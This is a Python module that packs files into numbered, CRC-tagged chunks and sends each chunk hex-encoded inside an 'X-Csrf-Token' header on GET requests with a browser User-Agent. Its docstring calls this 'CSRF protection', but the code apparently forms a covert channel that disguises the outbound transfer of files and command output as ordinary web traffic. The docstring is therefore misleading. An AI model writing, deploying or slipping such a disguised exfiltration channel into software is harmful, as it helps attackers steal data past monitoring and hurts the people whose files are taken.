import binascii
import struct
import requests

# Constants
MIN_CHUNK_SIZE = 0           # Minimum allowed chunk size in bytes
MAX_CHUNK_SIZE = 500          # Maximum allowed chunk size in bytes
INIT_FLAG = 0                 # Flag for init packet
PAYLOAD_FLAG = 1              # Flag for payload packet
FIN_FLAG = 2                  # Flag for fin packet
CTYPE_STDOUT = 0              # Type for stdout (optional, for future use)
CTYPE_BLOB = 1                # Type for binary data

def crc32(file_path):
    """Calculate the CRC32 checksum of a file and return it as a 4-byte packed integer."""
    checksum = 0
    with open(file_path, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b""):
            checksum = binascii.crc32(chunk, checksum)
    return struct.pack('>I', checksum & 0xffffffff)  # Ensure 32-bit unsigned integer

def set_header(chunk_size, seq, crc_id, flag, ctype, file_name=None):
    """Constructs a packet header with optional file name for init (flag=0) packets."""
    assert MIN_CHUNK_SIZE <= chunk_size <= MAX_CHUNK_SIZE, "Invalid chunk_size"
    assert 0 <= seq < 2**32, "Invalid sequence number"
    assert flag in {INIT_FLAG, PAYLOAD_FLAG, FIN_FLAG}, "Invalid flag"
    assert ctype in {CTYPE_STDOUT, CTYPE_BLOB}, "Invalid type"
    assert isinstance(crc_id, bytes) and len(crc_id) == 4, "Invalid ID"
    
    # Add file name padding only if init packet
    file_name_data = file_name.encode('utf-8').ljust(256, b'\x00') if flag == INIT_FLAG and file_name else b''
    return struct.pack('!H I 4s B B', chunk_size, seq, crc_id, flag, ctype) + file_name_data

def get_header(byte_data):
    """Parses a packet header and returns components as a dictionary."""
    if len(byte_data) < 12:
        raise ValueError("Incomplete header")
    
    chunk_size, seq, crc_id, flag, ctype = struct.unpack('!H I 4s B B', byte_data[:12])
    file_name = byte_data[12:].decode('utf-8').rstrip('\x00') if flag == INIT_FLAG else None

    return {
        'chunk_size': chunk_size,
        'seq': seq,
        'id': crc_id,
        'flag': flag,
        'type': ctype,
        'file_name': file_name
    }

def send_request_with_csrf(url, payload):
    """Sends a payload to the specified URL with CSRF protection headers."""
    assert url.startswith("http"), "Invalid URL"
    headers = {
        "X-Csrf-Token": payload.hex(),
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json",
    }
    return requests.get(url, headers=headers)

def receive_acknowledgment(response):
    """Processes server response to retrieve and return the acknowledged sequence number."""
    if response and response.status_code == 200:
        try:
            return response.json().get("seq")
        except ValueError:
            print("Failed to parse acknowledgment response.")
    return None
